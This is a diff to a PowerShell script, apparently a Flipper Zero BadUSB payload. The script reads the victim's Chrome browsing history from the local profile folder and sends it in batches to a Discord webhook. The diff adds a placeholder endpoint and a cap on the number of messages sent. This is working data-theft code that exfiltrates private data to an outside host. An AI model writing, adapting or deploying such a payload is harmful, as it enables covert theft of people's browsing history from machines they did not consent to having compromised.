@@ -8,7 +8,8 @@ Technically for use in Flipper Zero BadUSB
 
 
 $filePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\history"
-
+#$endpoint = "XXXXXXXXXXXXXXXXXX"
+#$maxMsgs = 5 # Maximum number of messages to send to Discord
 
 # Check if the file exists
 if (!(Test-Path $filePath)) {
@@ -38,7 +39,7 @@ foreach ($url in $urls) {
 # Add the last message
 $messages += $currentMessage
 
-$totalMessages = $messages.Count
+$totalMessages = [Math]::Min($messages.Count, $maxMsgs)
 $currentMessageNumber = 1
 
 # Send each message to Discord webhook with a delay of 0.5 seconds
@@ -54,6 +55,10 @@ foreach ($message in $messages) {
     Start-Sleep -Milliseconds 500  # Delay for 0.5 seconds
 
     $currentMessageNumber++
+
+    if ($currentMessageNumber -gt $maxMsgs) {
+        break
+    }
 }
 
 # Display success message
